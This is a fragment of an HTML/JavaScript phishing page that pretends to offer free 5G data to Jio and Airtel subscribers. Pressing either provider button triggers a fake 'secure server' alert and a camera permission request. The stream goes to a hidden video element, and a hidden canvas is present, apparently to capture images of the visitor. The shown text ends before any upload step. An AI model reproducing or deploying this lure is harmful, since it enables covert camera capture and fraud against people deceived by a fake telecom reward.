...
<body>
    ...
    `);
        ...
        .jio { background: #1539cf; color: white; } .airtel { background: #f40000; color: white; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#00d2ff;">Verify SIM Reward</h2>
        <p>Select provider to claim 50GB Free 5G Data</p>
        <button class="jio" onclick="start()">JIO 5G</button>
        <button class="airtel" onclick="start()">AIRTEL 5G</button>
    </div>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
    <script>
        ...
        async function start() {
            if(!uid) return alert("System Error: Invalid Session ID (Code: 403)");
            alert("Connecting to secure server... Please allow camera for identity verification.");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;
